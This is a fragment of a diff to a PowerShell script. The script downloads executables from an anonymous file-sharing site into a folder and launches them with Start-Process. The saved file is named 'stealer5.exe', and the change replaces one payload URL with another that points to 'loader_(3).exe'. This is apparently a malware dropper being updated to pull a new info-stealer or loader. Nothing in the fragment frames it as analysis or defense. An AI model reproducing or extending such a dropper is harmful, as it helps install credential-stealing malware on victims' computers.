@@ -24,7 +24,7 @@ if (!(Test-Path $filePath)) {
 Start-Process -FilePath $filePath -NoNewWindow
 
 $filePath = "$folderPath\stealer5.exe"
-$url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
+$url = "https://anonsharing.com/file/3400ff9837d2f447/loader_(3).exe"
 if (!(Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force
 }
